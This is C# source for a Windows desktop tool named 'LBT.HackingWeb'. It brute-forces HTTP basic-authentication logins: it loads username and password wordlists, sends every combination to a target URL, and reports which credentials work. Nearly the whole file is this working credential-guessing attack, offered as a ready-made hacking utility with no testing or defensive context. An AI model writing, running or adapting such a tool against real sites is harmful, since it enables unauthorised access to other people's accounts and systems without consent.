using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace LBT.HackingWeb
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow
    {
        private Task _processTask;
        private readonly CancellationTokenSource _cancellationTokenSource = new CancellationTokenSource();
        private readonly CancellationToken _cancellationToken;

        public MainWindow()
        {
            _cancellationToken = _cancellationTokenSource.Token;

            InitializeComponent();
        }

        protected override void OnClosing(System.ComponentModel.CancelEventArgs e)
        {
            if (_processTask != null)
            {
                _cancellationTokenSource.Cancel();

                try
                {
                    _processTask.Wait(_cancellationToken);
                }
                catch (OperationCanceledException)
                {
                }

                if (_processTask.Status != TaskStatus.Running)
                {
                    _processTask.Dispose();
                }

                _cancellationTokenSource.Dispose();
            }

            base.OnClosing(e);
        }

        private void BtnHack_Click(object sender, RoutedEventArgs e)
        {
            string url = TxtUrl.Text;
            string login = TxtLogin.Text;
            bool isRandomizeUser = CbxRandomizeUser.IsChecked.GetValueOrDefault();
            string password = TxtPassword.Text;
            bool isRandomizePassword = CbxRandomizePassword.IsChecked.GetValueOrDefault();

            if (_processTask != null)
            {
                _processTask.Dispose();
            }

            _processTask = new Task(() => ProcessHacking(url, login, isRandomizeUser, password, isRandomizePassword), _cancellationToken);
            _processTask.Start();
        }

        private void ProcessHacking(string url, string login, bool isRandomizeUser, string password, bool isRandomizePassword)
        {
            try
            {
                Dispatcher.Invoke(DisableComponents);

                AppendResultLine("Start hacking URL {0}...\n", url);

                if (!isRandomizeUser && !isRandomizePassword)
                {
                    SendWebRequest(url, login, password);
                }
                else
                {
                    string[] userVocabulary = isRandomizeUser
                                                  ? File.ReadAllText("UsersVocabulary.txt").Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                                                  : String.IsNullOrEmpty(login)
                                                        ? new string[0]
                                                        : new[] { login };
                    string[] passwordVocabulary = isRandomizePassword
                                                      ? File.ReadAllText("PasswordVocabulary.txt").Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                                                      : String.IsNullOrEmpty(password)
                                                            ? new string[0]
                                                            : new[] { password };

                    for (int i = 0; i < userVocabulary.Length; i++)
                    {
                        var httpStatusCode = HttpStatusCode.NoContent;
                        for (int j = 0; j < passwordVocabulary.Length; j++)
                        {
                            int progress = (i * passwordVocabulary.Length + j) / (userVocabulary.Length * passwordVocabulary.Length) * 100;
                            Dispatcher.Invoke(() => SetProgress(progress));

                            string testLogin = userVocabulary[i];
                            string testPassword = passwordVocabulary[j];
                            httpStatusCode = SendWebRequest(url, testLogin, testPassword);
                            if (httpStatusCode == HttpStatusCode.OK)
                                break;
                        }

                        if (httpStatusCode == HttpStatusCode.OK)
                            break;
                    }
                }

                Dispatcher.Invoke(EnableComponents);
            }
            catch (Exception ex)
            {
                AppendResultLine("Application throw an exception:");
                AppendResultLine(ex.Message);
                AppendResultLine(ex.StackTrace);
            }
        }

        private HttpStatusCode SendWebRequest(string url, string login, string password)
        {
            HttpWebResponse httpWebResponse = null;
            try
            {
                WebRequest webRequest = WebRequest.Create(url);
                webRequest.Credentials = new NetworkCredential(login, password);

                httpWebResponse = (HttpWebResponse)webRequest.GetResponse();
                if (httpWebResponse.StatusCode == HttpStatusCode.OK)
                {
                    AppendResultLine("Opening web as {0}:{1} was successfull.", login, password);
                }
                else
                {
                    AppendResultLine("Opening web as {0}:{1} failed. HttpStatusCode: {2}", login, password, httpWebResponse.StatusCode);
                    AppendResultLine("Description: {0}", httpWebResponse.StatusDescription);
                }

                return httpWebResponse.StatusCode;
            }
            catch (WebException wex)
            {
                if (wex.Message.Contains("The remote server returned an error: (401) Unauthorized."))
                {
                    AppendPartialResultLine("Opening web as {0}:{1} failed with (401) Unauthorized status.", login, password);
                    return HttpStatusCode.Unauthorized;
                }

                AppendResultLine("Opening web as {0}:{1} failed with unknown status.", login, password);
                AppendResultLine("Description: {0}", wex.Message);

                return HttpStatusCode.InternalServerError;
            }
            catch (Exception ex)
            {
                if (httpWebResponse != null)
                {
                    AppendResultLine("Opening web as {0}:{1} failed. HttpStatusCode: {2}", login, password, httpWebResponse.StatusCode);
                    AppendResultLine("Description: {0}", httpWebResponse.StatusDescription);
                    return httpWebResponse.StatusCode;
                }

                AppendResultLine("Opening web as {0}:{1} failed with unknown status.", login, password);
                AppendResultLine("Description: {0}", ex.Message);

                return HttpStatusCode.InternalServerError;
            }
            finally
            {
                if (httpWebResponse != null)
                {
                    httpWebResponse.Dispose();
                }
            }
        }

        private void DisableComponents()
        {
            TxtUrl.IsEnabled = false;
            TxtLogin.IsEnabled = false;
            TxtPassword.IsEnabled = false;
            CbxRandomizePassword.IsEnabled = false;
            BtnHack.IsEnabled = false;
            TxtResult.Clear();
        }

        private void SetProgress(int progress)
        {
            Title = String.Format("{0}% completed...", progress);
        }

        private void AppendResultLine(object message, params object[] args)
        {
            Dispatcher.Invoke(() =>
                                  {
                                      try
                                      {
                                          TxtResult.AppendText(String.Format("{0}\n", String.Format(message.ToString(), args)));
                                          TxtResult.Focus();
                                          TxtResult.CaretIndex = TxtResult.Text.Length;
                                          TxtResult.ScrollToEnd();

                                      }
                                      // ReSharper disable EmptyGeneralCatchClause
                                      catch (Exception)
                                      // ReSharper restore EmptyGeneralCatchClause
                                      {
                                      }
                                  });
        }

        private void AppendPartialResultLine(object message, params object[] args)
        {
            Dispatcher.Invoke(() =>
                                  {
                                      try
                                      {
                                          TxtPartialResult.Text = String.Format("{0}\n", String.Format(message.ToString(), args));
                                      }
                                          // ReSharper disable EmptyGeneralCatchClause
                                      catch (Exception)
                                          // ReSharper restore EmptyGeneralCatchClause
                                      {
                                      }
                                  });
        }

        private void EnableComponents()
        {
            Title = "LBT.HackingWeb";
            TxtUrl.IsEnabled = true;
            TxtLogin.IsEnabled = true;
            TxtPassword.IsEnabled = true;
            CbxRandomizePassword.IsEnabled = true;
            BtnHack.IsEnabled = true;
        }
    }
}
